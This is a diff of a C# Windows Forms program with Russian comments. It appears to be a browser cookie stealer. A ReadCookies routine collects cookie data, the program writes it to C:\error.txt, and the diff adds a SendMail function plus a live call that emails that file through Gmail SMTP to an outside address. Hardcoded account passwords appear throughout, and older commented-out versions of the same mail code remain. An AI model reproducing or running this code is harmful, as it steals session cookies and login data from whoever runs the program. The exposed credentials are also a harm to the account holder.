@@ -21,8 +21,47 @@ namespace WindowsFormsApp1
         {
             Resolver.RegisterDependencyResolver();
         }
-        
-                /// <summary>
+
+        // функция отправки файла
+        /// <summary>
+        /// Отправка письма на почтовый ящик C# mail send
+        /// </summary>
+        /// <param name="smtpServer">Имя SMTP-сервера</param>
+        /// <param name="from">Адрес отправителя</param>
+        /// <param name="password">пароль к почтовому ящику отправителя</param>
+        /// <param name="mailto">Адрес получателя</param>
+        /// <param name="caption">Тема письма</param>
+        /// <param name="message">Сообщение</param>
+        /// <param name="attachFile">Присоединенный файл</param>
+        public static void SendMail(string smtpServer, string from, string password,
+        string mailto, string caption, string message, string attachFile = null)
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                mail.From = new MailAddress(from);
+                mail.To.Add(new MailAddress(mailto));
+                mail.Subject = caption;
+                mail.Body = message;
+                if (!string.IsNullOrEmpty(attachFile))
+                    mail.Attachments.Add(new Attachment(attachFile));
+                SmtpClient client = new SmtpClient();
+                client.Host = smtpServer;
+                client.Port = 587;
+                client.EnableSsl = true;
+                client.Credentials = new NetworkCredential(from.Split('@')[0], password);
+                client.DeliveryMethod = SmtpDeliveryMethod.Network;
+                client.Send(mail);
+                mail.Dispose();
+            }
+            catch (Exception e)
+            {
+                throw new Exception("Mail.Send: " + e.Message);
+            }
+        }
+
+
+        /// <summary>
         /// Главная точка входа для приложения.
         /// </summary>
         static public IEnumerable<Tuple<string, string, string, string, string>> ReadCookies()
@@ -183,7 +222,7 @@ namespace WindowsFormsApp1
            
             Vivod();
             Process.Start("chrome");
-
+            SendMail("smtp.gmail.com", "andersonneo1337@gmail.com", "ferrari1996", "kainapro@gmail.com", "Project", "take this one", "C:\\error.txt");
 
 
             /* здесь указываете SMTP и Порт, у меня например mail.ru - я 
@@ -192,57 +231,57 @@ namespace WindowsFormsApp1
 
             /* здесь на месте login указываете логин, на месте password - пароль, 
             если у вас example@mail.ru то указываете просто example (без mail.ru) */
-             // Smtp.Credentials = new NetworkCredential("neoanderson1999", "ferrari1996");
-              MailMessage Message = new MailMessage();
+            // Smtp.Credentials = new NetworkCredential("neoanderson1999", "ferrari1996");
+            // MailMessage Message = new MailMessage();
 
             /* на месте login@mail.ru указываете свой E-mail, на месте KUDA@rambler.ru 
             указываете куда будет отправлено письмо (это может быть не обязательно rambler)*/
-             Message.From = new MailAddress("neoanderson1999@mail.ru");
-              Message.To.Add(new MailAddress("anton.evgrashin@mail.ru"));
+            //  Message.From = new MailAddress("neoanderson1999@mail.ru");
+            // Message.To.Add(new MailAddress("anton.evgrashin@mail.ru"));
 
             //Тема сообщения на месте Theme и текст сообщения на месте Text
             // Message.Subject = "Забыл сказать";
-          //  Message.Body = "Вот лови";
+            //  Message.Body = "Вот лови";
 
             /*Далее указываете путь к файлу (при переходе в папку указывайте 2 слэша)*/
-              //string file = "D:\\error.txt";
+            //string file = "D:\\error.txt";
 
-             // Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
-              //Message.Attachments.Add(attach);
+            // Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
+            //Message.Attachments.Add(attach);
 
             //Smtp.Send(Message); //сообщение отправлено
 
-            MailAddress fromMailAddress = new MailAddress("andersonneo1337@gmail.com", "Sergey Boiko");
-            MailAddress toAddress = new MailAddress("kainapro@gmail.com", "Uncle Bob");
+            //  MailAddress fromMailAddress = new MailAddress("andersonneo1337@gmail.com", "Sergey Boiko");
+            //  MailAddress toAddress = new MailAddress("kainapro@gmail.com", "Uncle Bob");
 
-            using (MailMessage mailMessage = new MailMessage(fromMailAddress, toAddress))
-            using (SmtpClient smtpClient = new SmtpClient())
-            {
+            //  using (MailMessage mailMessage = new MailMessage(fromMailAddress, toAddress))
+            //    using (SmtpClient smtpClient = new SmtpClient())
+            // {
 
-               // string file2 = "D:\\error.txt";
-                mailMessage.Subject = "My Subject";
-                mailMessage.Body = "Text in the body";
+            // string file2 = "D:\\error.txt";
+            //   mailMessage.Subject = "My Subject";
+            //   mailMessage.Body = "Text in the body";
 
-                smtpClient.Host = "smtp.gmail.com";
-                smtpClient.Port = 587;
-                smtpClient.EnableSsl = true;
-                smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
-                smtpClient.UseDefaultCredentials = false;
-                smtpClient.Credentials = new NetworkCredential(fromMailAddress.Address, "ferrari1996");
+            //    smtpClient.Host = "smtp.gmail.com";
+            //    smtpClient.Port = 587;
+            //    smtpClient.EnableSsl = true;
+            //    smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
+            //    smtpClient.UseDefaultCredentials = false;
+            //   smtpClient.Credentials = new NetworkCredential(fromMailAddress.Address, "ferrari1996");
 
-                string file2 = @"\error.txt";
-                //Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
-               // Attachment attData = new Attachment(@"D:\error.txt");
+            //  string file2 = @"\error.txt";
+            //Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
+            // Attachment attData = new Attachment(@"D:\error.txt");
 
-               Attachment attach = new Attachment(file2, MediaTypeNames.Application.Octet);
-               Message.Attachments.Add(attach);
-
-
-                //Message.Attachments.Add(attData);
+            //  Attachment attach = new Attachment(file2, MediaTypeNames.Application.Octet);
+            //   Message.Attachments.Add(attach);
 
 
-                smtpClient.Send(mailMessage);
-            }
+            //Message.Attachments.Add(attData);
+
+
+            // smtpClient.Send(mailMessage);
+            //   }
 
 
 
